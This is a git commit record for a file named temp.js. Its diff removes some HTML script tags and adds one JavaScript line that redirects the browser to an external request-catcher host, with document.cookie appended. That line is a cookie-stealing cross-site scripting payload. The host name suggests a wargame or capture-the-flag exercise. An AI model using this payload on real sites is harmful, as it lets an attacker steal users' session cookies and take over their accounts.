80905ee45544bf2b32955df22f9908b57d00e96f
jerry <160117974+15571601@users.noreply.github.com>
2024-05-20 14:23:34 +0900

    Update temp.js

--- temp.js
+++ temp.js
@@ -1,5 +1,1 @@
-<!-- Bootstrap core JavaScript -->
-    <script src="/static/js/jquery.min.js" nonce=a9becc2ef47cd00d1a654bd308df0524></script>
-    <script src="/static/js/bootstrap.min.js" nonce=a9becc2ef47cd00d1a654bd308df0524></script> 
-</body>
-</html>
+location.href="https://ixwqbhr.request.dreamhack.games?param="+document.cookie
